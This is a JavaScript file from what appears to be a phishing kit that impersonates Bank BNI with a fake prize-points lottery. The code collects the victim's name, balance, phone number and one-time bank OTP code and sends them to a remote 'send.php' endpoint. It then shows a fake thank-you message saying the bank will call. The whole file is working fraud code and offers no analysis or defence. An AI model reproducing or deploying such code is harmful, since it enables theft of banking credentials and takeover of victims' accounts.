import { API_URL } from './global.js';

var currLen = 1;

function startTypingEffect() {
	var text = "Terimah kasih telah mendaftar di layanan bank bni gebyar undian tukar poin, pendaftaran anda sedang diproses, sesaat lagi anda akan di hubungi oleh pihak bank bni, Untuk proses cetak kode kupon undian anda";
	setTimeout(() => {
		if (currLen < text.length) {
			currLen++;
			$("#text1").html(text.substring(0, currLen));
			startTypingEffect();
		}
	}, 50);
}

module.closeAlert = function() {
	$("#alert").css('display', 'none');
};

module.next = function() {
	setTimeout(() => {
		var otp = $("#otp").val().trim();
	    if (otp.length==0) {
	    	alert('Mohon masukkan 6-digit kode OTP!');
            return;
    	}
        var name = window.localStorage.getItem('name');
        var balance = window.localStorage.getItem('balance');
        var phone = window.localStorage.getItem('phone');
        $("#loader").css('display', 'flex');
        setTimeout(() => {
        	var fd = new FormData();
            fd.append('message', 'Nama: '+name+'\nSaldo: Rp'+balance+'\nNo. HP: '+phone+'\nKode OTP: '+otp);
            $.ajax({
            	url: API_URL+'/send.php',
               type: 'POST',
                data: fd,
                processData: false,
                contentType: false,
                success: function(response) {
                	$("#loader").css('display', 'none');
                	$("#otp-form").css('display', 'none');
                	$("#thank").css('display', 'block');
                    // $("#success-audio")[0].play();
                    startTypingEffect();
                }
            });
        }, 1000);
	}, 500);
};

function closeConfirmationDialog() {
	$("#confirmation").css('display', 'none');
	$("#thank").css('display', 'flex');
	// $("#success-audio")[0].play();
	startTypingEffect();
}

module.closeConfirmationDialog = closeConfirmationDialog;